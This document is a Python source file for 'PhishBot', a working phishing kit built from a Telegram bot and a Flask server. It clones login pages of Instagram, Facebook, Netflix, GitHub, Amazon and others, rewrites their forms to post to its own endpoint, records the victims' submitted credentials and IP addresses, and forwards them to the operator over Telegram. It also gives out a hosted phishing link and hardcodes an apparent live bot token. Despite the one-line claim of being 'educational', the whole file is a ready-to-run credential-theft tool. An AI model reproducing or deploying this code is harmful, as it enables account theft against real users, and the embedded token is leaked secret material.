# Import necessary libraries
from flask import Flask, request, send_from_directory  # Web framework for serving pages
import threading  # For running Flask and Telegram bot concurrently
import telebot  # Python Telegram bot API
from telebot import types  # For Telegram UI elements like buttons
import os  # For file and directory operations
import json  # For storing credentials in JSON format
from datetime import datetime  # For timestamps
import shutil  # For copying files

# Telegram bot API token
API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
bot = telebot.TeleBot(API_TOKEN)  # Initialize Telegram bot
app = Flask(__name__)  # Initialize Flask web application

# JSON file to store all credentials
CREDS_FILE = 'captured_credentials.json'


# Ensure the creds file exists
def initialize_creds_file():
    if not os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'w') as f:
            json.dump({}, f)


# List of websites to imitate for phishing
TEMPLATES = [
    "Instagram", "Facebook", "Netflix", "Twitter", "Snapchat",
    "GitHub", "LinkedIn", "Spotify", "Reddit", "Amazon", "Sample"
]

# Dictionary to store user states if needed for multi-step operations
user_states = {}


# Root route - Simple confirmation that the server is running
@app.route('/')
def home():
    return "🤖 Bot is running on Flask!"


# Route to serve the phishing page to victims
# Each user gets their own unique phishing page based on user_id
@app.route('/phish/<user_id>', methods=['GET'])
def serve_phish_page(user_id):
    folder = f"phished_pages/{user_id}"
    if os.path.exists(f"{folder}/index.html"):
        return send_from_directory(folder, "index.html")
    return "Page not found", 404


# Route to handle form submissions from phishing pages
# Captures credentials and forwards them to the attacker via Telegram
@app.route('/submit/<user_id>', methods=['POST'])
def capture_creds(user_id):
    # Extract all form fields submitted by victim
    creds = request.form.to_dict()

    # Add timestamp and IP for tracking
    creds['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    creds['ip'] = request.remote_addr

    # Format credentials as text for Telegram message
    msg = "\n".join(f"{k}: {v}" for k, v in creds.items())

    # Send credentials to attacker via Telegram
    bot.send_message(user_id, f"🛑 Credentials Captured:\n\n{msg}")

    # Save credentials to JSON file
    save_credentials(user_id, creds)

    # Response to victim's browser
    return "✅ Credentials submitted."


# Function to save credentials to JSON file
def save_credentials(user_id, creds):
    try:
        # Load existing data
        with open(CREDS_FILE, 'r') as f:
            all_creds = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        all_creds = {}

    # Add credentials to user's collection
    if user_id not in all_creds:
        all_creds[user_id] = []

    all_creds[user_id].append(creds)

    # Save updated data
    with open(CREDS_FILE, 'w') as f:
        json.dump(all_creds, f, indent=2)


# Command handler for /start and /help - Introduces the bot and shows commands
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, (
        "🎣 Welcome to PhishBot!\n\n"
        "Commands:\n"
        "/fish - Start phishing\n"
        "/info - About\n"
        "/history - View your captured credentials"
    ))


# Command handler for /info - Shows information about the bot
@bot.message_handler(commands=['info'])
def send_info(message):
    bot.reply_to(message, "Educational phishing simulator.")


# Command handler for viewing credential history
@bot.message_handler(commands=['history'])
def view_history(message):
    user_id = str(message.chat.id)

    try:
        with open(CREDS_FILE, 'r') as f:
            all_creds = json.load(f)

        if user_id in all_creds and all_creds[user_id]:
            # User has captured credentials
            count = len(all_creds[user_id])
            bot.send_message(user_id, f"📊 You have captured {count} credential set(s).")

            # Send the most recent 5 captures
            recent = all_creds[user_id][-5:]
            for i, cred in enumerate(recent):
                # Format each credential set
                msg = "\n".join(f"{k}: {v}" for k, v in cred.items())
                bot.send_message(user_id, f"📝 Capture {i + 1}:\n\n{msg}")
        else:
            # No credentials captured yet
            bot.send_message(user_id, "📭 You haven't captured any credentials yet.")
    except (FileNotFoundError, json.JSONDecodeError):
        bot.send_message(user_id, "📭 No credentials history found.")


# Command handler for /fish - Displays a menu of website templates to choose from
@bot.message_handler(commands=['fish'])
def send_fish_menu(message):
    # Create a custom keyboard with website options
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    buttons = [types.KeyboardButton(site) for site in TEMPLATES]
    markup.add(*buttons)
    bot.send_message(message.chat.id, "📄 Choose a phishing template:", reply_markup=markup)


# Message handler for template selection - Processes the chosen website
# Creates a customized phishing page and returns a URL to share with victims
@bot.message_handler(func=lambda msg: msg.text in TEMPLATES)
def handle_template_selection(message):
    template = message.text
    user_id = str(message.chat.id)
    bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")

    # Locate template and create output directory
    template_path = f"Templates/{template}/index.html"
    output_path = f"phished_pages/{user_id}"
    os.makedirs(output_path, exist_ok=True)

    if os.path.exists(template_path):
        # Copy template files to user's directory
        try:
            # Copy the template directory contents to the user's directory
            template_dir = f"Templates/{template}"
            for item in os.listdir(template_dir):
                src = os.path.join(template_dir, item)
                dst = os.path.join(output_path, item)
                if os.path.isfile(src):
                    shutil.copy2(src, dst)
                elif os.path.isdir(src):
                    shutil.copytree(src, dst, dirs_exist_ok=True)

            # Modify the HTML to include the user_id in form action
            modify_html_form(f"{output_path}/index.html", user_id)

            phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
            bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    else:
        bot.send_message(message.chat.id, f"❌ Template '{template}' not found.")


# Function to modify HTML file to include user_id in form action
def modify_html_form(html_path, user_id):
    try:
        with open(html_path, 'r', encoding='utf-8') as f:
            content = f.read()

        # Replace form action with our submission URL
        # This is a simple replace - in real scenarios, you might need more robust HTML parsing
        modified = content.replace('action="', f'action="/submit/{user_id}"')

        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(modified)
        return True
    except Exception:
        return False


# Default message handler for unrecognized commands
@bot.message_handler(func=lambda m: True)
def fallback(m):
    bot.reply_to(m, "❓ Unknown command. Use /start")


# Function to run the Telegram bot in the background
def run_bot():
    bot.infinity_polling()


# Main entry point - Starts both the Flask web server and Telegram bot
if __name__ == '__main__':
    # Initialize credentials file
    initialize_creds_file()

    # Create directories if they don't exist
    os.makedirs("phished_pages", exist_ok=True)

    # Start Telegram bot in a separate thread
    threading.Thread(target=run_bot).start()

    # Get port from environment variable (for Render compatibility)
    port = int(os.environ.get("PORT", 5001))

    # Start Flask web server
    app.run(host='0.0.0.0', port=port)